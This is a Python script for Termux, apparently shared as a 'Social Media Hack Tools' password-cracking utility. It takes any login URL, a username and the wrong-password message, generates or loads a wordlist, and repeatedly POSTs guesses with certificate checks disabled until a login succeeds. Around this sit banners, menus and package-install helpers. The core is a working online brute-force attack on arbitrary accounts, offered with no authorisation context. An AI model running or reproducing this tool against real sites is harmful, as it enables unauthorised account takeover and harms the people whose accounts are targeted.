import os
import subprocess
import threading
import requests
import time
import sys
import itertools
from shutil import which
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── ANSI colors ──
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
RESET  = "\033[0m"

# ── Ensure termux-api available ──
def ensure_termux_api():
    if which("termux-open-url") is None:
        print(f"{YELLOW}Installing termux-api...{RESET}")
        subprocess.run(["pkg", "install", "-y", "termux-api"])

# ── Banner ──
banner = rf"""
{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{GREEN}                    ⚔ WELCOME TO: Social Media Hack Tools ⚔
{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{GREEN}
    ____             _____             __   __  __      _   ____   
   / __ \____ ______/ ___/      ______/ /  / / / /___ _/ | / / /____  _____ 
  / /_/ / __ `/ ___/\__ \ | /| / / __  /  / /_/ / __ `/  |/ / __/ _ \/ ___/ 
 / ____/ /_/ (__  )___/ / |/ |/ / /_/ /  / __  / /_/ / /|  / /_/  __/ / 
/_/    \__,_/____//____/|__/|__/\__,_/  /_/ /_/\__,_/_/ |_/\__/\___/_/ 

{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{GREEN}                       []-ℂ𝕣𝕒t𝕖-𝔹𝕐_Hk_Ptashant_Singh-[]
{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                     |.|
{RED}                                     |.|
            ⠀   ⠀／⌒ヽ               |.|          ⠀⠀／⌒ヽ
     　       　/° ω°                |.|         　/° ω°   
            ＿ノ ヽ　ノ ＼＿         |.|       ＿ノ ヽ　ノ ＼＿    
           ‘/     / ⌒Ｙ⌒ Ｙ ヽ       |.|      ‘/     / ⌒Ｙ⌒ Ｙ ヽ    
           ( 　(三ヽ人　 /　 |       |.|      ( 　(三ヽ人　 /　 |    
           |　ﾉ⌒＼ ￣￣ヽ　 ノ       |.|      |　ﾉ⌒＼ ￣￣ヽ　 ノ 
           ヽ＿＿＿＞､＿＿／         |.|      ヽ＿＿＿＞､＿＿／   
            　 ｜( 王 ﾉ〈            |.|         ｜( 王 ﾉ〈   
            　 /ﾐ`ー―彡ヽ            |.|      　 /ﾐ`ー―彡ヽ  
             　/　ヽ／　 |           |.|       　/　ヽ／　 |
                            {BLUE}         |.|
{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{CYAN}                              []-P S-Hac_KeR -[]
{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                                                                                                  
{CYAN}
"""

# ── Spinner with Count + Percentage ──
def loading_spinner(text="Loading"):
    spinner = itertools.cycle(["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"])
    total = 30
    for i in range(1, total + 1):
        percent = int((i / total) * 100)
        sys.stdout.write(f"\r{CYAN}{text} {next(spinner)}  {i}/{total}  [{percent}%]{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    print("\r", end="")

# ── Brute Force Class ──
class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message

    def crack(self, password):
        data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
        try:
            response = requests.post(self.url, data=data_dict, verify=False)
        except Exception as e:
            print(f"{RED}❌ Error: {e}{RESET}")
            return False
        if self.error_message in str(response.content):
            return False
        elif "CSRF" in str(response.content) or "csrf" in str(response.content):
            print(f"{RED}CSRF Token Detected! BruteForce not working on this site.{RESET}")
            sys.exit()
        else:
            print(f"\n{GREEN}✔️ SUCCESS! PASSWORD MATCHED ✅{RESET}")
            print(f"{CYAN}🔐 Username: {self.username}")
            print(f"🔑 Password: {password}{RESET}")
            print(f"{GREEN}🎯 Login Successful! Brute Force Complete.{RESET}")
            os.system("echo '\033[1;91m       👨‍💻 Created by: Hk Prashant Singh 🇮🇳 – Indian Ethical Hacker\033[0m' | lolcat")
            return True

# ── Cracking Logic ──
def crack_passwords(passwords, cracker):
    total = len(passwords)
    for count, password in enumerate(passwords, 1):
        password = password.strip()
        percent = int((count / total) * 100)
        bar_len = 32
        bar_fill = percent * bar_len // 100
        bar = '█' * bar_fill + '-' * (bar_len - bar_fill)

        print(f"{CYAN}[{percent:3d}%] |{bar}| 🔁 Trying: {password}  Count: {count}{RESET}")
        print(f"{YELLOW}🔢 Line: {count} - Trying Password: {password}{RESET}")

        time.sleep(0.1)

        if cracker.crack(password):
            print(f"\n{GREEN}🎯 Attack Finished! Password found at {count} attempt.{RESET}")
            return
    print(f"\n{RED}❌ Password not found in wordlist.{RESET}")

# ── Password Selection With Countdown ──
def select_password_mode(timeout=15):
    print(f"""{CYAN}
╔════════════════════════════════════════════╗
║        🔑 Password Selection Menu          ║
╠════════════════════════════════════════════╣
║ [1] 🔧 Generate Password (auto wordlist)   ║
║ [2] 📂 Use Default Password File (hk.txt)  ║
╚════════════════════════════════════════════╝
{RESET}""")
    result = {"option": "2"}
    user_input_done = threading.Event()

    def wait_for_input():
        try:
            choice = input(f"{YELLOW}Select Option ➤ {RESET}").strip()
            if choice in ['1', '2']:
                result["option"] = choice
            user_input_done.set()
        except:
            pass

    def show_countdown():
        for i in range(timeout, 0, -1):
            if user_input_done.is_set():
                return
            plus = f"{i:02d} [+]"
            minus = f"{timeout - i:02d} [-]"
            sys.stdout.write(f"\r{BLUE}⏱️ Auto-select in {plus}  Elapsed: {minus}      {RESET}")
            sys.stdout.flush()
            time.sleep(1)

    t1 = threading.Thread(target=wait_for_input)
    t2 = threading.Thread(target=show_countdown)
    t1.start()
    t2.start()
    t1.join(timeout)
    user_input_done.set()
    print("\n")

    if result["option"] == '1':
        auto_generate_wordlist()
        return "hk2.txt"
    else:
        print(f"{GREEN}📂 Auto-selected: Default password file (hk.txt){RESET}")
        return "hk.txt"

# ── Auto Wordlist Generator ──
def auto_generate_wordlist():
    print(f"{CYAN}⚙️ Auto Wordlist Generator (Saved as hk2.txt){RESET}")
    base = input(f"{YELLOW}Enter base word(s) (comma separated): {RESET}")
    add_numbers = input(f"{YELLOW}Add numbers to words? (y/n): {RESET}").lower() == 'y'

    base_words = [word.strip() for word in base.split(",") if word.strip()]
    numbers = [str(n) for n in range(1000)] if add_numbers else []

    generated = []
    for word in base_words:
        generated.append(word)
        for num in numbers:
            generated.append(f"{word}{num}")
            generated.append(f"{num}{word}")

    with open("hk2.txt", "w") as f:
        for word in generated:
            f.write(word + "\n")

    print(f"{GREEN}✅ Wordlist generated as 'hk2.txt' with {len(generated)} entries.{RESET}")

# ── Delete Wordlist ──
def delete_wordlist_file():
    if os.path.exists("hk2.txt"):
        os.remove("hk2.txt")
        print(f"{GREEN}🗑️ 'hk2.txt' deleted successfully.{RESET}")
    else:
        print(f"{RED}❌ 'hk2.txt' does not exist.{RESET}")

# ── Brute Force Launcher ──
def main():
    print(f"""{CYAN}
           ╔════════════════════════════════════════════════════╗
           ║     💻 Social Media Crack – Login Page URL Paste   ║
           ╚════════════════════════════════════════════════════╝
{RESET}""")
    url = input(f"{CYAN}Enter Target URL ➤ {RESET}")
    username = input(f"{CYAN}Enter Username ➤ {RESET}")
    error = input(f"{CYAN}Enter Error Message (wrong password text) ➤ {RESET}")
    cracker = BruteForceCracker(url, username, error)
    pwd_file = select_password_mode()
    try:
        with open(pwd_file, "r") as f:
            passwords = f.readlines()
            crack_passwords(passwords, cracker)
    except FileNotFoundError:
        print(f"{RED}❌ File not found: {pwd_file}{RESET}")
        sys.exit()

# ── Menu UI ──
def show_menu():
    print(f"""{CYAN}
        ╔══════════════════════════════════════════════════════════╗
        ║              🔐 Brute Force Tool Menu                    ║
        ╠══════════════════════════════════════════════════════════╣
        ║ [1] 🚀 Start Brute Force Attack                          ║
        ║ [2] 🧾 About Tool                                        ║
        ║ [3] 🔗 Open My Links                                     ║
        ║ [4] 🛠️  Update & Setup Packages                           ║
        ║ [5] 📦 Install All Required Packages                     ║
        ║ [6] 🧾 Generate Wordlist (hk2.txt)                       ║
        ║ [7] 🗑️  Delete Wordlist File (hk2.txt)                    ║
        ║ [8] ❌ Exit                                              ║
        ╚══════════════════════════════════════════════════════════╝
{RESET}""")

def main_menu():
    while True:
        show_menu()
        os.system("echo '\033[1;91m       👨‍💻 Created by: Hk Prashant Singh 🇮🇳 – Indian Ethical Hacker\033[0m' | lolcat")
        choice = input(f"{YELLOW}Select Option ➤ {RESET}")
        if choice == '1':
            loading_spinner("🚀 Starting Attack")
            main()
        elif choice == '2':
            print(f"""
{GREEN}╔════════════════════════════════════════════════════════════════════════╗
║                       🔐 TOOL INFORMATION PANEL  🔐                    ║
╠════════════════════════════════════════════════════════════════════════╣
║ 📛 Tool Name     : Password-hunter                                     ║
║ 👤 Author        : Hk_Prashant_Singh 🇮🇳                                ║
║ 🎖️  Title         : Indian Ethical Hacker                               ║
║ 🛰️  Project       : Indian Cyber Contribution                           ║
╚════════════════════════════════════════════════════════════════════════╝
{RESET}
""")
        elif choice == '3':
            while True:
                print(f"""{CYAN}
╔════════════════════════════════════════════╗
║           🌐 Open My Links Menu            ║
╠════════════════════════════════════════════╣
║ [1] 🌐 Open Website                        ║
║ [2] 📸 Open Instagram                      ║
║ [3] 🔙 Back to Main Menu                   ║
╚════════════════════════════════════════════╝
{RESET}""")
                sub = input(f"{YELLOW}Select Option ➤ {RESET}")
                if sub == '1':
                    subprocess.run(["termux-open-url", "https://sites.google.com/view/hkprashantsingh/home"])
                elif sub == '2':
                    subprocess.run(["termux-open-url", "https://www.instagram.com/hk.prashant_singh?igsh=ZGV5YTFjYTY3NWs4"])
                elif sub == '3':
                    break
                else:
                    print(f"{RED}❌ Invalid option. Try again.{RESET}")
        elif choice == '4':
            print(f"{CYAN}🛠️ Updating Termux packages and installing termux-api...{RESET}")
            subprocess.run(["pkg", "update", "-y"])
            subprocess.run(["pkg", "upgrade", "-y"])
            subprocess.run(["pkg", "install", "-y", "termux-api"])
            print(f"{GREEN}✅ Update and installation completed!{RESET}")
        elif choice == '5':
            print(f"{CYAN}📦 Installing all required packages...{RESET}")
            subprocess.run(["pkg", "install", "-y", "python", "termux-api", "openssl", "git"])
            subprocess.run(["pip", "install", "requests"])
            print(f"{GREEN}✅ All packages installed successfully!{RESET}")
        elif choice == '6':
            auto_generate_wordlist()
        elif choice == '7':
            delete_wordlist_file()
        elif choice == '8':
            print(f"{RED}❌ Exiting... Thank you for using the tool!{RESET}")
            sys.exit()
        else:
            print(f"{RED}❌ Invalid option. Try again.{RESET}")

# ── Start Tool ──
if __name__ == '__main__':
    os.system("clear")
    ensure_termux_api()
    print(banner)
    loading_spinner("🔐 Loading Tool")
    print(f"                        {GREEN}✅ Tool Loaded Successfully ✅!{RESET}")
    main_menu()